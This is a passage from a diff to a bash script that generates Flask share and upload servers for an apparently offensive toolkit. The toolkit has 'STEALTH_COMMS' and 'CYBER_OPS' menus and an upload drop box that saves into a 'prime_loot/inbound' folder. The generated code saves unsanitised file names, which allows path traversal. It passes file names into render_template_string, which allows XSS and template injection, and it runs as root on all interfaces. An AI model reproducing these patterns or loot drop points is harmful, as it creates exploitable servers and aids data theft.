-    app.run(host='0.0.0.0', port=5000, debug=False)
-EOF
-}
-
-
-# Функция-генератор для Share-Server (v1.0)
-# --- ГЕНЕРАТОР МОДУЛЯ SHARE-SERVER (SHARE SECTOR) ---
-generate_share_server_code_raw() {
-    # Загружаем только базовый шаблон страницы
-    local template=$(generate_core_template)
-
-    cat << EOF
-from flask import Flask, render_template_string, send_from_directory
-import os
-
-app = Flask(__name__)
-SHARE_DIR = '/root/share'
-
-if not os.path.exists(SHARE_DIR):
-    os.makedirs(SHARE_DIR, exist_ok=True)
-
-$template
-
-def get_file_icon(filename):
-    """Определяет иконку в зависимости от расширения файла."""
-    ext = filename.split('.')[-1].lower() if '.' in filename else ''
-    icons = {
-        'pdf': '📕',
-        'jpg': '🖼️', 'jpeg': '🖼️', 'png': '🖼️', 'gif': '🖼️', 'webp': '🖼️',
-        'zip': '📦', 'rar': '📦', '7z': '📦', 'tar': '📦', 'gz': '📦',
-        'py': '💻', 'js': '💻', 'html': '💻', 'sh': '💻', 'css': '💻',
-        'txt': '📄', 'md': '📝', 'doc': '📄', 'docx': '📄',
-        'mp4': '🎬', 'mkv': '🎬', 'mov': '🎬',
-        'mp3': '🎵', 'wav': '🎵', 'flac': '🎵'
-    }
-    return icons.get(ext, '📄')
-
-@app.route('/')
-def index():
-    try:
-        files = sorted(os.listdir(SHARE_DIR))
-    except:
-        files = []
-    
-    # Формируем сетку файлов с использованием новых стилей .file-grid и .file-item
-    grid_content = '<div class="file-grid">'
-    for f in files:
-        icon = get_file_icon(f)
-        grid_content += f"""
-        <a href="/get/{f}" class="file-item" target="_blank">
-            <span class="file-icon" style="font-size: 2.5rem; display: block; margin-bottom: 10px;">{icon}</span>
-            <div style="font-size: 0.8rem; word-break: break-all; line-height: 1.2;">{f}</div>
-        </a>
-        """
-    
-    if not files:
-        grid_content += '<p style="color: var(--accent); font-style: italic; grid-column: 1/-1; opacity: 0.5;">[ SECTOR_EMPTY: No data detected ]</p>'
-    
-    grid_content += '</div>'
-    grid_content += f'<div style="margin-top: 30px; padding-top: 15px; border-top: 1px solid rgba(255,255,255,0.1); font-family: monospace; font-size: 0.7rem; opacity: 0.5;">MOUNT_POINT: {SHARE_DIR}</div>'
-
-    return render_template_string(render_prime_page("SECURE_FILE_DISTRIBUTION", grid_content))
-
-@app.route('/get/<filename>')
-def get_file(filename):
-    return send_from_directory(SHARE_DIR, filename)
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5002, debug=False)
-EOF
-}
-
-
-# Функция-генератор для Upload-Server (v1.0)
-generate_upload_server_code_raw() {
-    local templates="$(generate_core_template)
-$(generate_core_form_template)"
-
-    cat << EOF
-from flask import Flask, request, render_template_string
-import os
-
-app = Flask(__name__)
-# Сохраняем во входящую папку внутри PRIME_LOOT
-UPLOAD_DIR = os.path.join(os.environ.get('PRIME_LOOT') or '/root/prime_loot', 'inbound')
-
-if not os.path.exists(UPLOAD_DIR):
-    os.makedirs(UPLOAD_DIR, exist_ok=True)
-
-$templates
-
-@app.route('/')
-def index():
-    fields = [{"type": "file", "name": "file", "label": "SELECT_UPLINK_DATA"}]
-    form_html = render_prime_form("/upload", fields=fields, btn_text="INITIATE UPLOAD")
-    return render_template_string(render_prime_page("INBOUND_DROP_BOX", form_html))
-
-@app.route('/upload', methods=['POST'])
-def upload():
-    if 'file' not in request.files: return "TRANSFER_ERROR", 400
-    f = request.files['file']
-    if f.filename == '': return "EMPTY_FILENAME", 400
-    
-    f.save(os.path.join(UPLOAD_DIR, f.filename))
-    return "SUCCESS: File received in secure sector."
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5001, debug=False)
-EOF
-}
 
 
 # --- Server Generating---
@@ -3152,11 +3168,19 @@ menu_deep_bridge() {
 }
 
 menu_stealth_comms() {
-    core_engine_ui "h" "STEALTH COMMS: LIVE NODES"
+    # 1. Запуск прогресс-бара для красоты перехода
+    core_engine_progress 1 "STEALTH_COMMS"
+    
+    # 2. Имена для отображения в меню (красивые)
     local names="Live_Node_AV Shared_Node_Store Upload_Portal Node_Destroy"
-    local funcs="run_live_node_av run_shared_store run_upload_portal run_node_clean"
+    
+    # 3. РЕАЛЬНЫЕ имена функций из твоего кода (исправлено)
+    local funcs="run_av_server run_share_server run_upload_server run_node_clean"
+    
+    # 4. Запуск через контроллер
     prime_dynamic_controller "STEALTH_COMMS" "$names" "$funcs"
 }
+
 
 run_main_menu() {
     local main_names="CYBER_OPS INTELLIGENCE CRYPTO_LAB NET_INFRA FIN_SHIELD STEALTH_COMMS SYSTEM_CORE CORE_LAB DATA_FORENSICS DEEP_BRIDGE EXIT"
